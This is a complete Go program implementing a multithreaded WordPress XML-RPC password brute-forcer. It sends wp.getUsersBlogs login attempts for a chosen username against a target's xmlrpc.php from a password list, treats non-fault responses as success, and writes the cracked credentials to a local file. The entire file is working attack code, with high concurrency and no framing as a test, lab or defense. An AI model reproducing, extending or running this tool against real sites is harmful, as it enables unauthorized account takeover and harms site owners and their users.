package main

import (
	"bufio"
	"bytes"
	"context"
	"encoding/xml"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// --- Configuration (defaults) ---
const (
	defaultUsername = "admin"
	defaultMethod   = "wp.getUsersBlogs" // Common WordPress method
	defaultThreads  = 100                // Increased default for Go
	defaultTimeout  = 10                 // seconds for requests
	outputFile      = "lol_go.txt"
)

// --- XML Structures ---

// RequestPayload is the structure for the XML-RPC request
type RequestPayload struct {
	XMLName    xml.Name `xml:"methodCall"`
	MethodName string   `xml:"methodName"`
	Params     []Param  `xml:"params>param"`
}

// Param represents a parameter in the XML-RPC call
type Param struct {
	Value Value `xml:"value"`
}

// Value holds the actual data, typically a string for username/password
type Value struct {
	String string `xml:"string,omitempty"`
	// Add other types like Int, Boolean if needed for other methods
}

// ResponsePayload is the structure for the XML-RPC response
type ResponsePayload struct {
	XMLName xml.Name    `xml:"methodResponse"`
	Params  []Param     `xml:"params>param,omitempty"` // Used on success
	Fault   *FaultValue `xml:"fault,omitempty"`        // Used on error
}

// FaultValue represents an XML-RPC fault
type FaultValue struct {
	Value struct {
		Struct []Member `xml:"struct>member"`
	} `xml:"value"`
}

// Member is a key-value pair in an XML-RPC struct
type Member struct {
	Name  string      `xml:"name"`
	Value MemberValue `xml:"value"`
}

// MemberValue holds the value of a fault member (e.g., faultCode, faultString)
type MemberValue struct {
	Int    int    `xml:"int,omitempty"`
	String string `xml:"string,omitempty"`
}

// --- Globals for communication and state ---
var (
	foundPasswordGlobal atomic.Value // Stores the found password (string)
	triedPasswordsCount int64
	totalPasswords      int64
	statusLock          sync.Mutex // To protect printStatus if it becomes more complex
	methodToTry         string
	wg                  sync.WaitGroup
	once                sync.Once
	httpClient          *http.Client
)

func printStatus(message string) {
	statusLock.Lock()
	defer statusLock.Unlock()
	// \r moves the cursor to the beginning of the line.
	// Print spaces to clear the previous message, then the new one.
	fmt.Fprintf(os.Stderr, "\r%s", strings.Repeat(" ", 80)) // Clear up to 80 chars
	fmt.Fprintf(os.Stderr, "\r%s", message)
	// No os.Stderr.Flush() needed typically, as Stderr is often unbuffered or line-buffered.
}

func buildXMLPayload(methodName, username, password string) ([]byte, error) {
	payload := RequestPayload{
		MethodName: methodName,
		Params: []Param{
			{Value: Value{String: username}},
			{Value: Value{String: password}},
		},
	}
	xmlBytes, err := xml.MarshalIndent(payload, "", "  ")
	if err != nil {
		return nil, fmt.Errorf("failed to marshal XML: %w", err)
	}
	return append([]byte(xml.Header), xmlBytes...), nil
}

func attemptLogin(ctx context.Context, url, username, password, methodName string) (string, bool) {
	if ctx.Err() != nil {
		return "", false
	}
	if fpVal := foundPasswordGlobal.Load(); fpVal != nil {
		if _, ok := fpVal.(string); ok { // Check if it's a string (meaning password found)
			return "", false
		}
	}


	xmlData, err := buildXMLPayload(methodName, username, password)
	if err != nil {
		// log.Printf("Error building XML for '%s': %v", password, err) // Keep low verbosity
		return "", false
	}

	req, err := http.NewRequestWithContext(ctx, "POST", url, bytes.NewBuffer(xmlData))
	if err != nil {
		// log.Printf("Error creating request for '%s': %v", password, err)
		return "", false
	}
	req.Header.Set("Content-Type", "text/xml")
	req.Header.Set("User-Agent", "Go XML-RPC BruteForcer")

	var respBodyBytes []byte

	resp, err := httpClient.Do(req)
	if err != nil {
		if ctx.Err() != nil { // Check if context cancelled (e.g. main timeout, found password, Ctrl+C)
			return "", false
		}
		// log.Printf("HTTP request error for '%s': %v", password, err)
		return "", false
	}
	defer resp.Body.Close()

	// Increment tried count regardless of outcome, as long as a request was made.
	// Do it here, because if the request itself fails (network error), it's still an attempt.
	// If we only increment on successful HTTP status, we might miscount.
	// Moved increment after successful response read for more accuracy on "processed" attempts.

	respBodyBytes, err = io.ReadAll(resp.Body)
	if err != nil {
		// log.Printf("Error reading response body for '%s': %v", password, err)
		return "", false
	}
	
	// Increment tried passwords count *after* a response is processed
	// to better reflect actual work done by the server.
	atomic.AddInt64(&triedPasswordsCount, 1)


	if resp.StatusCode != http.StatusOK {
		// log.Printf("HTTP Error for '%s': %d", password, resp.StatusCode)
		return "", false
	}

	var rpcResponse ResponsePayload
	err = xml.Unmarshal(respBodyBytes, &rpcResponse)
	if err != nil {
		// log.Printf("Non-XML response or parse error for '%s' (status %d): %v", password, resp.StatusCode, err)
		// log.Printf("Response preview: %s", string(respBodyBytes[:min(200, len(respBodyBytes))]))
		return "", false
	}

	if rpcResponse.Fault != nil {
		var faultCode int
		for _, member := range rpcResponse.Fault.Value.Struct {
			if member.Name == "faultCode" {
				faultCode = member.Value.Int
			}
		}
		if faultCode == 403 {
			// Correctly failed login for this password
		} else {
			// Other XML-RPC fault
			// log.Printf("XML-RPC Fault for '%s': Code %d", password, faultCode)
		}
		return "", false
	}

	// If no fault, assume success.
	// For wp.getUsersBlogs, specific check for an <array> in response:
	if methodName == "wp.getUsersBlogs" {
		if !bytes.Contains(respBodyBytes, []byte("<array>")) {
			// log.Printf("Unexpected XML structure for '%s' (not a fault, but not expected success for %s)", password, methodName)
			return "", false
		}
	}
	
	return password, true
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func main() {
	targetURL := flag.String("url", "", "Target XML-RPC URL (e.g., http://target.com/xmlrpc.php)")
	passwordFile := flag.String("pfile", "", "File containing passwords, one per line")
	username := flag.String("u", defaultUsername, "Username")
	numThreads := flag.Int("t", defaultThreads, "Number of concurrent goroutines")
	timeoutSeconds := flag.Int("timeout", defaultTimeout, "Request timeout in seconds")
	method := flag.String("method", defaultMethod, "XML-RPC method")
	flag.Parse()

	if *targetURL == "" || *passwordFile == "" {
		fmt.Println("Target URL and password file are required.")
		flag.Usage()
		os.Exit(1)
	}
	methodToTry = *method
	foundPasswordGlobal.Store("") // Initialize with empty string

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Fprintf(os.Stderr, "\n[!] Ctrl+C detected. Shutting down...\n")
		cancel()
	}()

	transport := &http.Transport{
		Proxy: http.ProxyFromEnvironment,
		DialContext: (&net.Dialer{
			Timeout:   5 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		ForceAttemptHTTP2:     true, // Can be true
		MaxIdleConns:          *numThreads + 20, // A bit more buffer
		MaxIdleConnsPerHost:   *numThreads + 20,
		IdleConnTimeout:       90 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second, // Slightly more generous
		ExpectContinueTimeout: 1 * time.Second,
		DisableKeepAlives:     false, // Keep them enabled for performance
	}
	httpClient = &http.Client{
		Transport: transport,
		Timeout:   time.Duration(*timeoutSeconds) * time.Second,
	}

	log.Printf("[*] Target URL: %s", *targetURL)
	log.Printf("[*] Username:   %s", *username)
	log.Printf("[*] Password File: %s", *passwordFile)
	log.Printf("[*] Goroutines: %d", *numThreads)
	log.Printf("[*] Timeout:    %ds", *timeoutSeconds)
	log.Printf("[*] Method:     %s", methodToTry)
	log.Printf("[*] Output File: %s", outputFile)
	log.Println("-------------------------------")

	file, err := os.Open(*passwordFile)
	if err != nil {
		log.Fatalf("[!] Error: Password file '%s' not found: %v", *passwordFile, err)
	}
	defer file.Close()

	var passwords []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		pass := strings.TrimSpace(scanner.Text())
		if pass != "" {
			passwords = append(passwords, pass)
		}
	}
	if err := scanner.Err(); err != nil {
		log.Fatalf("[!] Error reading password file: %v", err)
	}
	if len(passwords) == 0 {
		log.Fatalln("[!] Password file is empty.")
	}
	totalPasswords = int64(len(passwords))
	log.Printf("[*] Loaded %d passwords.", totalPasswords)

	startTime := time.Now()

	passwordChan := make(chan string, *numThreads) // Buffered channel for work distribution

	// Launch worker goroutines
	for i := 0; i < *numThreads; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case pass, ok := <-passwordChan:
					if !ok { // Channel closed
						return
					}
					// Double check context before expensive operation
					if ctx.Err() != nil {
						return
					}

					foundPass, success := attemptLogin(ctx, *targetURL, *username, pass, methodToTry)
					
                    // Status update logic
                    currentTried := atomic.LoadInt64(&triedPasswordsCount)
                    // Only update status if no password has been found yet to avoid overwriting success message
                    if fpVal := foundPasswordGlobal.Load(); fpVal == nil || fpVal.(string) == "" {
                        if currentTried > 0 && (currentTried%20 == 0 || currentTried == totalPasswords || success) { // Update status periodically or on last/success
                            progress := (float64(currentTried) / float64(totalPasswords)) * 100
                            statusMsg := fmt.Sprintf("[*] Attempts: %d/%d (%.2f%%) | Testing: %-20.20s...", currentTried, totalPasswords, progress, pass)
                            printStatus(statusMsg)
                        }
                    }


					if success {
						once.Do(func() { // Ensure this block runs only once across all goroutines
							foundPasswordGlobal.Store(foundPass)
							printStatus(strings.Repeat(" ", 80)) // Clear status line fully
							successMsg := fmt.Sprintf("\n[+] SUCCESS! Username: '%s', Password: '%s'", *username, foundPass)
							fmt.Println(successMsg) // Print to stdout
							fmt.Fprintf(os.Stderr, "    URL: %s\n", *targetURL)
							fmt.Fprintf(os.Stderr, "    Method: %s\n", methodToTry)

							f_out, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
							if err != nil {
								log.Printf("[!] Error saving to %s: %v", outputFile, err)
							} else {
								output := fmt.Sprintf("URL: %s\nUsername: %s\nPassword: %s\nMethod: %s\n%s\n",
									*targetURL, *username, foundPass, methodToTry, strings.Repeat("-", 20))
								if _, err := f_out.WriteString(output); err != nil {
									log.Printf("[!] Error writing to %s: %v", outputFile, err)
								} else {
									fmt.Fprintf(os.Stderr, "[*] Credentials saved to %s\n", outputFile)
								}
								f_out.Close() // Close file immediately after writing
							}
							cancel() // Signal all other goroutines and the password feeder to stop
						})
						return // This worker goroutine can exit as password is found
					}
				}
			}
		}(i) // Pass workerID for potential debugging
	}

	// Feed passwords to the channel, respecting context cancellation
	feederDone := make(chan struct{})
	go func() {
		defer close(passwordChan) // Close channel when all passwords are sent or feeder exits
		defer close(feederDone)
		for _, pass := range passwords {
			select {
			case <-ctx.Done(): // If context is cancelled (password found or Ctrl+C)
				return // Stop feeding passwords
			case passwordChan <- pass:
				// Password sent
			}
		}
	}()

	// Wait for all workers to finish OR for the feeder to finish if context is cancelled early.
	// This allows workers to process passwords already in the channel even if new ones stop being fed.
	wg.Wait()     // Wait for all worker goroutines to complete their current tasks or exit due to context.
	<-feederDone // Ensure feeder has also acknowledged shutdown or finished sending.


	// Final status clear and summary
	printStatus(strings.Repeat(" ", 80) + "\r") // Clear the status line completely
	fmt.Println("\n" + strings.Repeat("-", 30))

	finalTriedCount := atomic.LoadInt64(&triedPasswordsCount)
	elapsedTime := time.Since(startTime)

	if fpVal := foundPasswordGlobal.Load(); fpVal != nil {
		if foundPass, ok := fpVal.(string); ok && foundPass != "" {
			fmt.Printf("[+] Password found: '%s' for username '%s'\n", foundPass, *username)
			fmt.Printf("[*] Details saved to %s\n", outputFile)
		} else {
			fmt.Printf("[-] Password not found for username '%s'.\n", *username)
		}
	} else {
		fmt.Printf("[-] Password not found for username '%s'.\n", *username)
	}

	fmt.Printf("[*] Total time taken: %.2f seconds.\n", elapsedTime.Seconds())
	fmt.Printf("[*] Total attempts made: %d\n", finalTriedCount)

	if ctx.Err() == context.Canceled && (foundPasswordGlobal.Load() == nil || foundPasswordGlobal.Load().(string) == "") {
		// If canceled but no password found, it was likely Ctrl+C
		fmt.Println("[*] Process interrupted by user.")
	}
}
